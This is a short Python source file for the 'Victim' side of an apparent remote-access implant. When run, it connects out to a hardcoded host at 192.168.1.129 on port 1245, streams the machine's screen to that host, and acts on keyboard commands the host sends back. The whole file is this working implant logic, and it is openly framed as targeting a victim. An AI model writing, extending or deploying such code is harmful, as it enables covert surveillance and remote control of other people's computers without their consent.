import socket
import sys
import threading

from screen_mirroring.screen_stream import ScreenStream

sys.path.append('..')

from handelrs.keyboard_handelr import HandelKeyboard
from protocol.protocol import HandelPacket, PacketType


class Victim:

    def __init__(self, server_ip, server_port):
        self.SERVER_IP = server_ip
        self.SERVER_PORT = server_port
        self.ADDR = (self.SERVER_IP, self.SERVER_PORT)
        self.victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connected = True

    def handel(self):
        while self.connected:
            packet_type, packet_payload = HandelPacket.recv_packet(self.victim)

            if packet_type == PacketType.KEYBOARD.value:
                HandelKeyboard.handel(packet_payload)

    def stream(self):
        ScreenStream.transmit_frames(self.victim)

    def main(self):

        try:
            self.victim.connect(self.ADDR)

            handel_thread = threading.Thread(target=self.handel)
            stream_thread = threading.Thread(target=self.stream)

            handel_thread.start()
            stream_thread.start()

            handel_thread.join()
            stream_thread.join()

        except Exception as e:
            print(e)

        while self.connected: pass

        self.victim.close()


if __name__ == '__main__':
    Victim('192.168.1.129', 1245).main()
